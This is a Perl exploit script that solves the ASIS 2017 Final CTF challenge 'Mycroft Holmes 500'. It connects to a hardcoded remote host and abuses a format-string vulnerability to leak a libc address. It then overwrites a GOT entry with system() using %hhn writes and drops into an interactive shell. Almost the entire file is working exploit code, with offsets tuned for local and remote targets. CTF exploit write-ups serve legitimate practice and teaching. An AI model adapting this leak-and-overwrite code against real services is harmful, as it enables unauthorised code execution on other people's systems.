#
# ASIS 2017 Final - Mycroft Holmes 500
#
# Copyright (c) 2014-2019 gpp256
# This software is distributed under the MIT License.

use pwntools;
use Time::HiRes qw (usleep);
$pwntools::ARCH = '64';
# local
#$lsm_offset=0x20950;
#$system_offset=0x443d0;
# remote
$lsm_offset=0x20740;
$system_offset=0x45390;

#&connect(\$s, 'localhost', 8000) or die "ng";
&connect(\$s, '146.185.168.172', 14273) or die "ng";
usleep(800000);
$buf="s\n"; syswrite($s, $buf, length($buf)); 

# leak stack addrs
#foreach (200..230) {
#&read_until($s, qr/\n\>\>\>\s/, 10);
#$buf="? \%$_\$p"; $buf.="_" x (50-length($buf))."\n\n";syswrite($s, $buf, length($buf));
#$data = &read_until($s, qr/\>/, 10);# print $data;
#$data =~ /(\S+)\_/ && do { printf("\n%03d: %s", $_, $1) ; };
#}

# leak libc_base
&read_until($s, qr/\n\>\>\>\s/, 10);
$buf="? \%160\$s"."_" x 8 .p(0x603ff0); $buf.="_" x (50-length($buf))."\n\n";syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\>/, 10);# print $data;
$data =~ /(\S+)\_/ && do { $str = $1; $libc_base = u(substr($str, 0, 6)."\x00\x00")-$lsm_offset; };
$system_addr = $libc_base + $system_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
printf("[+] system_addr = 0x%016x\n", $system_addr);

# attack
$a=($system_addr & 0xff); $b=($system_addr>>8 & 0xff); $c=($system_addr>>16 & 0xff);
printf("[+] %02x > %02x > %02x ?\n", $a, $c, $b); # $a > $c > $b と想定
$x = $b; $y = $c-$b; $z = $a-$c;
$buf="? \%${x}c\%165\$hhn\%${y}c\%166\$hhn\%${z}c\%167\$hhn"; 
$buf.="_" x (56-length($buf)).p(0x604089).p(0x60408a).p(0x604088)."\n\n";
syswrite($s, $buf, length($buf));
&interact($s);
__END__
# remote
[+] lsm_addr = 0x00007ff1ab4cb000
